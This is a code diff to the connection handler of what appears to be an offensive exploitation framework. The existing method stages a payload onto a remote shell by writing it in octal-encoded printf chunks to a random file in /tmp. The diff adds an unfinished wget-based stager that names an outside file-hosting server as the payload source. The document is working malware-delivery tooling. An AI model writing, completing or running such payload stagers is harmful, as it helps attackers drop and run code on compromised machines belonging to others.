@@ -68,6 +68,14 @@ class Handler(TCP):
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
+    def wget_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
+        self.badges.output_process("Sending payload stage...")
+        filename = binascii.hexlify(os.urandom(8)).decode()
+        path = location + '/' + filename
+        
+        wget_stream = "wget '{}' -qO {}"
+        wget_server = "https://dev.filebin.net"
+
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -102,16 +110,16 @@ class Handler(TCP):
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
 
-        echo_stream = "printf '{}' >> {}"
-        echo_max_length = 100
+        printf_stream = "printf '{}' >> {}"
+        printf_max_length = 100
 
         size = len(payload)
-        num_parts = int(size / echo_max_length) + 1
+        num_parts = int(size / printf_max_length) + 1
 
         for i in range(0, num_parts):
-            current = i * echo_max_length
-            block = self.bytes_to_octal(payload[current:current + echo_max_length])
-            command = echo_stream.format(block, path)
+            current = i * printf_max_length
+            block = self.bytes_to_octal(payload[current:current + printf_max_length])
+            command = printf_stream.format(block, path)
 
             self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
             if encode:
